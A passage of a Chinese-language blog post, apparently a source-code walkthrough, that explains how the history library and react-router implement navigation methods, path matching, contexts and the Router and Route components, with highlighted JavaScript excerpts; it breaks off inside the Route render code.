a POP.</span></span><br><span class="line">        ignorePath = path;</span><br><span class="line">        replaceHashPath(encodedPath);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> prevIndex = allPaths.indexOf(createPath(history.location));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (prevIndex !== <span class="number">-1</span>) allPaths[prevIndex] = path;</span><br><span class="line"></span><br><span class="line">      setState(&#123; action, location &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceHashPath</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> hashIndex = <span class="built_in">window</span>.location.href.indexOf(<span class="string">'#'</span>);</span><br><span class="line">  <span class="built_in">window</span>.location.replace(</span><br><span class="line">    <span class="built_in">window</span>.location.href.slice(<span class="number">0</span>, hashIndex &gt;= <span class="number">0</span> ? hashIndex : <span class="number">0</span>) + <span class="string">'#'</span> + path</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="memoryHistory中的实现-2"><a href="#memoryHistory中的实现-2" class="headerlink" title="memoryHistory中的实现"></a>memoryHistory中的实现</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line">  warning(</span><br><span class="line">    !(</span><br><span class="line">      <span class="keyword">typeof</span> path === <span class="string">'object'</span> &amp;&amp;</span><br><span class="line">      path.state !== <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">      state !== <span class="literal">undefined</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'You should avoid providing a 2nd state argument to replace when the 1st '</span> +</span><br><span class="line">      <span class="string">'argument is a location-like object that already has state; it is ignored'</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'REPLACE'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = createLocation(path, state, createKey(), history.location);</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      history.entries[history.index] = location;</span><br><span class="line"></span><br><span class="line">      setState(&#123; action, location &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="history-go-、history-goBack-、history-goForward"><a href="#history-go-、history-goBack-、history-goForward" class="headerlink" title="history.go()、history.goBack()、history.goForward()"></a>history.go()、history.goBack()、history.goForward()</h2><h3 id="browserHistory、hashHistory中的实现"><a href="#browserHistory、hashHistory中的实现" class="headerlink" title="browserHistory、hashHistory中的实现"></a>browserHistory、hashHistory中的实现</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  globalHistory.go(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goBack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  go(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goForward</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  go(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="memoryHistory中的实现-3"><a href="#memoryHistory中的实现-3" class="headerlink" title="memoryHistory中的实现"></a>memoryHistory中的实现</h3><p>计算nextIndex（一般为history.index + n），执行POP action即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clamp</span>(<span class="params">n, lowerBound, upperBound</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.min(<span class="built_in">Math</span>.max(n, lowerBound), upperBound);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> nextIndex = clamp(history.index + n, <span class="number">0</span>, history.entries.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'POP'</span>;</span><br><span class="line">  <span class="keyword">const</span> location = history.entries[nextIndex];</span><br><span class="line"></span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">        setState(&#123;</span><br><span class="line">          action,</span><br><span class="line">          location,</span><br><span class="line">          index: nextIndex</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Mimic the behavior of DOM histories by</span></span><br><span class="line">        <span class="comment">// causing a render after a cancelled POP.</span></span><br><span class="line">        setState();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goBack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  go(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goForward</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  go(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="history-block"><a href="#history-block" class="headerlink" title="history.block()"></a>history.block()</h2><h3 id="browserHistory、hashHistory中的实现-1"><a href="#browserHistory、hashHistory中的实现-1" class="headerlink" title="browserHistory、hashHistory中的实现"></a>browserHistory、hashHistory中的实现</h3><p>block提供了setPrompt的调用接口，因为我们前面介绍过，push、pop、replace action都是在transitionManager.confirmTransitionTo的回调函数中执行的，只有回调函数返回true,才能真正执行这些action。而前面我们看到回调函数的返回结果其实是由用户传递的prompt方法决定的，这样就可以让用户根据自己的逻辑决定是否阻塞路由跳转了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> isBlocked = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params">prompt = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> unblock = transitionManager.setPrompt(prompt);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!isBlocked) &#123;</span><br><span class="line">    checkDOMListeners(<span class="number">1</span>);</span><br><span class="line">    isBlocked = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isBlocked) &#123;</span><br><span class="line">      isBlocked = <span class="literal">false</span>;</span><br><span class="line">      checkDOMListeners(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unblock();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="memoryHistory中的实现-4"><a href="#memoryHistory中的实现-4" class="headerlink" title="memoryHistory中的实现"></a>memoryHistory中的实现</h3><p>memoryHistory不需要做DOM事件监听的相关处理。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params">prompt = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> transitionManager.setPrompt(prompt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="react-router"><a href="#react-router" class="headerlink" title="react-router"></a>react-router</h1><p>我们之所以大篇幅介绍history库，是因为history库才是路由管理的底层逻辑，react-router其实只是使用react框架封装了history库的处理（主要使用context跨组件传递history的状态和方法）。介绍到这，你是不是已经能够大致勾勒出诸如<code>&lt;BrowserRouter&gt;</code>、<code>&lt;Route&gt;</code>、<code>&lt;Switch&gt;</code>、<code>&lt;Link&gt;</code>、<code>withRouter()</code>等的简单实现了呢？介绍来让我们看看react-router中具体是怎么实现的。</p>
<h2 id="createNamedContext"><a href="#createNamedContext" class="headerlink" title="createNamedContext()"></a>createNamedContext()</h2><p>该方法可以创建有displayName的context。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Replace with React.createContext once we can assume React 16+</span></span><br><span class="line"><span class="keyword">import</span> createContext <span class="keyword">from</span> <span class="string">"mini-create-react-context"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> createNamedContext = <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> context = createContext();</span><br><span class="line">  context.displayName = name;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> context;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createNamedContext;</span><br></pre></td></tr></table></figure>
<h2 id="generatePath"><a href="#generatePath" class="headerlink" title="generatePath()"></a>generatePath()</h2><p>生成路径，主要调用的是pathToRegexp.compile()方法，generatePath可以根据路径path和参数params生成完整的路径。比如<code>(&#39;/a/:id&#39;, { id: 1 }) -&gt; &#39;/a/1&#39;</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pathToRegexp <span class="keyword">from</span> <span class="string">"path-to-regexp"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cache = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> cacheLimit = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">let</span> cacheCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compilePath</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (cache[path]) <span class="keyword">return</span> cache[path];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> generator = pathToRegexp.compile(path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cacheCount &lt; cacheLimit) &#123;</span><br><span class="line">    cache[path] = generator;</span><br><span class="line">    cacheCount++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> generator;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Public API for generating a URL pathname from a path and parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePath</span>(<span class="params">path = <span class="string">"/"</span>, params = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> path === <span class="string">"/"</span> ? path : compilePath(path)(params, &#123; <span class="attr">pretty</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> generatePath;</span><br></pre></td></tr></table></figure>
<h2 id="matchPath"><a href="#matchPath" class="headerlink" title="matchPath()"></a>matchPath()</h2><p>该方法传入pathname，以及解析pathname的配置，可以得到从pathname中匹配的结果。这是我们使用react-router经常见到的数据，没错，它就是通过matchPath方法解析的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  path, <span class="comment">// the path used to match</span></span><br><span class="line">  url: path === <span class="string">"/"</span> &amp;&amp; url === <span class="string">""</span> ? <span class="string">"/"</span> : url, <span class="comment">// the matched portion of the URL</span></span><br><span class="line">  isExact, <span class="comment">// whether or not we matched exactly</span></span><br><span class="line">  params: keys.reduce(<span class="function">(<span class="params">memo, key, index</span>) =&gt;</span> &#123;</span><br><span class="line">    memo[key.name] = values[index];</span><br><span class="line">    <span class="keyword">return</span> memo;</span><br><span class="line">  &#125;, &#123;&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pathToRegexp <span class="keyword">from</span> <span class="string">"path-to-regexp"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cache = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> cacheLimit = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">let</span> cacheCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compilePath</span>(<span class="params">path, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> cacheKey = <span class="string">`<span class="subst">$&#123;options.end&#125;</span><span class="subst">$&#123;options.strict&#125;</span><span class="subst">$&#123;options.sensitive&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">const</span> pathCache = cache[cacheKey] || (cache[cacheKey] = &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pathCache[path]) <span class="keyword">return</span> pathCache[path];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> keys = [];</span><br><span class="line">  <span class="keyword">const</span> regexp = pathToRegexp(path, keys, options);</span><br><span class="line">  <span class="keyword">const</span> result = &#123; regexp, keys &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cacheCount &lt; cacheLimit) &#123;</span><br><span class="line">    pathCache[path] = result;</span><br><span class="line">    cacheCount++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Public API for matching a URL pathname to a path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">matchPath</span>(<span class="params">pathname, options = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">"string"</span> || <span class="built_in">Array</span>.isArray(options)) &#123;</span><br><span class="line">    options = &#123; <span class="attr">path</span>: options &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; path, exact = <span class="literal">false</span>, strict = <span class="literal">false</span>, sensitive = <span class="literal">false</span> &#125; = options;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> paths = [].concat(path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> paths.reduce(<span class="function">(<span class="params">matched, path</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!path &amp;&amp; path !== <span class="string">""</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (matched) <span class="keyword">return</span> matched;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; regexp, keys &#125; = compilePath(path, &#123;</span><br><span class="line">      end: exact,</span><br><span class="line">      strict,</span><br><span class="line">      sensitive</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> match = regexp.exec(pathname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!match) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [url, ...values] = match;</span><br><span class="line">    <span class="keyword">const</span> isExact = pathname === url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exact &amp;&amp; !isExact) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      path, <span class="comment">// the path used to match</span></span><br><span class="line">      url: path === <span class="string">"/"</span> &amp;&amp; url === <span class="string">""</span> ? <span class="string">"/"</span> : url, <span class="comment">// the matched portion of the URL</span></span><br><span class="line">      isExact, <span class="comment">// whether or not we matched exactly</span></span><br><span class="line">      params: keys.reduce(<span class="function">(<span class="params">memo, key, index</span>) =&gt;</span> &#123;</span><br><span class="line">        memo[key.name] = values[index];</span><br><span class="line">        <span class="keyword">return</span> memo;</span><br><span class="line">      &#125;, &#123;&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> matchPath;</span><br></pre></td></tr></table></figure>
<h2 id="historyContext"><a href="#historyContext" class="headerlink" title="historyContext"></a>historyContext</h2><p>创建historyContext。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> createNamedContext <span class="keyword">from</span> <span class="string">"./createNameContext"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> historyContext = <span class="comment">/*#__PURE__*/</span> createNamedContext(<span class="string">"Router-History"</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> historyContext;</span><br></pre></td></tr></table></figure>
<h2 id="routerContext"><a href="#routerContext" class="headerlink" title="routerContext"></a>routerContext</h2><p>创建routerContext。这里源码的写法有冗余了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Replace with React.createContext once we can assume React 16+</span></span><br><span class="line"><span class="keyword">import</span> createContext <span class="keyword">from</span> <span class="string">"mini-create-react-context"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> createNamedContext = <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> context = createContext();</span><br><span class="line">  context.displayName = name;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> context;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = <span class="comment">/*#__PURE__*/</span> createNamedContext(<span class="string">"Router"</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> context;</span><br></pre></td></tr></table></figure>
<h2 id="Lifecycle"><a href="#Lifecycle" class="headerlink" title="Lifecycle"></a>Lifecycle</h2><p>创建一个react组件，它是一个空组件，主要是为了在组件生命周期的各个阶段能够调用用户通过props传入的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lifecycle</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.onMount) <span class="keyword">this</span>.props.onMount.call(<span class="keyword">this</span>, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidUpdate(prevProps) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.onUpdate) <span class="keyword">this</span>.props.onUpdate.call(<span class="keyword">this</span>, <span class="keyword">this</span>, prevProps);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.onUnmount) <span class="keyword">this</span>.props.onUnmount.call(<span class="keyword">this</span>, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Lifecycle;</span><br></pre></td></tr></table></figure>
<h2 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h2><p><code>&lt;Router&gt;</code>是我们很常用的组件，有了前面的知识铺垫，它的实现就非常简单了。</p>
<p>组件内部有一个location的state，如果不是静态路由，通过history.listen方法监听history的变化。这里的history就是我们前面介绍的history库生成的history，它可以采用browserHistory、hashHistory、memoryHistory，history库对这三种history做了一致的接口封装。history如果发生改变，就是调用<code>this.setState({ location })</code>,组件重新渲染，RouterContext.Provider、HistoryContext.Provider的值更新，它们下面的跨级组件也能感知到，从而获得最新的参数和方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> HistoryContext <span class="keyword">from</span> <span class="string">"./HistoryContext.js"</span>;</span><br><span class="line"><span class="keyword">import</span> RouterContext <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for putting history on context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> computeRootMatch(pathname) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">path</span>: <span class="string">"/"</span>, <span class="attr">url</span>: <span class="string">"/"</span>, <span class="attr">params</span>: &#123;&#125;, <span class="attr">isExact</span>: pathname === <span class="string">"/"</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      location: props.history.location</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>._isMounted = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>._pendingLocation = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!props.staticContext) &#123;</span><br><span class="line">      <span class="keyword">this</span>.unlisten = props.history.listen(<span class="function"><span class="params">location</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>._isMounted) &#123;</span><br><span class="line">          <span class="keyword">this</span>.setState(&#123; location &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>._pendingLocation = location;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">this</span>._isMounted = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._pendingLocation) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123; <span class="attr">location</span>: <span class="keyword">this</span>._pendingLocation &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.unlisten) <span class="keyword">this</span>.unlisten();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;RouterContext.Provider</span><br><span class="line">        value=&#123;&#123;</span><br><span class="line">          history: <span class="keyword">this</span>.props.history,</span><br><span class="line">          location: <span class="keyword">this</span>.state.location,</span><br><span class="line">          match: Router.computeRootMatch(<span class="keyword">this</span>.state.location.pathname),</span><br><span class="line">          staticContext: <span class="keyword">this</span>.props.staticContext</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;HistoryContext.Provider</span><br><span class="line">          children=&#123;<span class="keyword">this</span>.props.children || <span class="literal">null</span>&#125;</span><br><span class="line">          value=&#123;<span class="keyword">this</span>.props.history&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;<span class="regexp">/RouterContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default Router;</span></span><br></pre></td></tr></table></figure>
<h2 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h2><p>使用RouterContext.Consumer可以感知到上层RouterContext.Provider值的变动，从而自动计算match，根据match的结果渲染匹配的业务组件（使用props传入children, component, render方法之一）。</p>
<p>如果有computedMatch属性说明在<code>&lt;Switch&gt;</code>组件中已经计算了match,可以直接使用。Switch组件我们后面会介绍。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; isValidElementType &#125; <span class="keyword">from</span> <span class="string">"react-is"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RouterContext <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"><span class="keyword">import</span> matchPath <span class="keyword">from</span> <span class="string">"./matchPath.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEmptyChildren</span>(<span class="params">children</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> React.Children.count(children) === <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evalChildrenDev</span>(<span class="params">children, props, path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> value = children(props);</span><br><span class="line"></span><br><span class="line">  warning(</span><br><span class="line">    value !== <span class="literal">undefined</span>,</span><br><span class="line">    <span class="string">"You returned `undefined` from the `children` function of "</span> +</span><br><span class="line">      <span class="string">`&lt;Route<span class="subst">$&#123;path ? <span class="string">` path="<span class="subst">$&#123;path&#125;</span>"`</span> : <span class="string">""</span>&#125;</span>&gt;, but you `</span> +</span><br><span class="line">      <span class="string">"should have returned a React element or `null`"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> value || <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for matching a single path and rendering.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;RouterContext.Consumer&gt;</span><br><span class="line">        &#123;context =&gt; &#123;</span><br><span class="line">          invariant(context, <span class="string">"You should not use &lt;Route&gt; outside a &lt;Router&gt;"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> location = <span class="keyword">this</span>.props.location || context.location;</span><br><span class="line">          <span class="keyword">const</span> match = <span class="keyword">this</span>.props.computedMatch</span><br><span class="line">            ? <span class="keyword">this</span>.props.computedMatch <span class="comment">// &lt;Switch&gt; already computed the match for us</span></span><br><span class="line">            : <span class="keyword">this</span>.props.path</span><br><span class="line">            ? matchPath(location.pathname, <span class="keyword">this</span>.props)</span><br><span class="line">            : context.match;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> props = &#123; ...context, location, match &#125;;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">let</span> &#123; children, component, render &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Preact uses an empty array as children by</span></span><br><span class="line">          <span class="comment">// default, so use null if that's the case.</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(children) &amp;&amp; children.length === <span class="number">0</span>) &#123;</span><br><span class="line">            children = <span class="literal">null</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> (</span><br><span class="line">            &lt;RouterContext.Provider value=&#123;props&#125;&gt;</span><br><span class="line">              &#123;props.match</span><br><span class="line">                ? children</span><br><span class="line">                  ? <span class="keyword">typeof</span> children === <span class="string">"function"</span></span><br><span class="line">                    ? __DEV__</span><br><span class="line">                      ? evalChildrenDev(children, props, <span class="keyword">this</span>.props.path)</span><br><span class="line">                      : children(props)</span><br><span class="line">                    : children</span><br><span class="line">                  : component</span><br><span class="line">                  ? React.createElement(component, props)</span><br><span class="line">                  : render</span><br><span class="line">                  ? render(props)</span><br><span class="line">                  : <span class="literal">null</span></span><br><span class="line">                : <span class="keyword">typeof</span> children === <span class="string">"function"</span></span><br><span class="line">                ? __DEV__</span><br><span class="line">                  ? evalChildrenDev(children, props, <span class="keyword">this</span>.props.path)</span><br><span class="line">                  : children(props)</span><br><span class="line">                